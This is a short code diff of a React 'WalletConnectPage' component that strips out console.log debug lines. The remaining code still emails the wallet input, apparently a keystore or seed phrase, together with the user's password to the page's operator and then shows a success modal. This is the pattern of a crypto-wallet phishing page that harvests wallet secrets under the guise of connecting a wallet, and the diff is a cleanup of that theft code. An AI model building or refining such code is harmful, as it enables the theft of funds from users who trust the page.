@@ -111,19 +111,14 @@ function WalletConnectPage() {
       }
   }
   
-  
-    console.log('Active Tab:', activeTab);
-    console.log('Input Value:', inputValue);
+
     if (activeTab === 'keystore') {
-      console.log('Password:', password);
     }
-    console.log(`Sending email with type: ${selectedWallet?.name} text ${inputValue}, Password - ${password}`);
   
     setIsLoading(true);
   
     try {
       await sendEmail(selectedWallet?.name, `Input Value: ${inputValue}, Password: ${password}`);
-      console.log('Email sent successfully');
       setShowSuccessModal(true);
   
       setTimeout(() => {
@@ -152,7 +147,6 @@ function WalletConnectPage() {
         throw new Error('Failed to send email');
       }
   
-      console.log('Email sent successfully');
       // Optionally, handle response data here
     } catch (error) {
       console.error('Error sending email:', error);
